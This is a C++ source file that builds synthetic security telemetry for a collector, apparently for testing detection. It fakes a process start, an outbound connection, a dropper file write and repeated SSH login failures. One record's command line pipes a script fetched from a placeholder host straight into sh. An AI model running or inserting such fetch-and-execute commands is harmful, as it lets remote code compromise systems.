#include "sources/synthetic_event_source.hpp"

namespace aegis::collector {

SyntheticEventSource::SyntheticEventSource(const CollectorConfig& cfg) {
  const std::string synthetic_guid = cfg.hostname + "-proc-1732";

  records_.push_back(ProcessStartRecord{
    .ts = "2026-03-12T10:00:00Z",
    .process_guid = synthetic_guid,
    .pid = 1732,
    .ppid = 1120,
    .uid = 1000,
    .user_name = "alice",
    .name = "bash",
    .exe = "/usr/bin/bash",
    .cmdline = "bash -c curl https://example.invalid/payload.sh | sh",
    .process_start_time = "2026-03-12T10:00:00Z",
  });

  records_.push_back(NetworkConnectRecord{
    .ts = "2026-03-12T10:00:02Z",
    .pid = 1732,
    .process_guid = synthetic_guid,
    .protocol = "tcp",
    .src_ip = "10.0.2.15",
    .src_port = 50122,
    .dst_ip = "198.51.100.10",
    .dst_port = 8444,
    .direction = "outbound",
  });

  records_.push_back(FileOpenRecord{
    .ts = "2026-03-12T10:00:04Z",
    .pid = 1732,
    .process_guid = synthetic_guid,
    .user_name = "alice",
    .path = "/tmp/dropper.bin",
    .flags = {"O_CREAT", "O_WRONLY"},
    .result = "success",
  });

  records_.push_back(AuthFailureRecord{
    .ts = "2026-03-12T10:00:06Z",
    .user_name = "admin",
    .method = "ssh",
    .src_ip = "203.0.113.77",
    .reason = "invalid_password",
  });

  records_.push_back(AuthFailureRecord{
    .ts = "2026-03-12T10:00:07Z",
    .user_name = "admin",
    .method = "ssh",
    .src_ip = "203.0.113.77",
    .reason = "invalid_password",
  });
}

std::optional<SourceRecord> SyntheticEventSource::next_event() {
  if (cursor_ >= records_.size()) {
    return std::nullopt;
  }
  return records_[cursor_++];
}

}  // namespace aegis::collector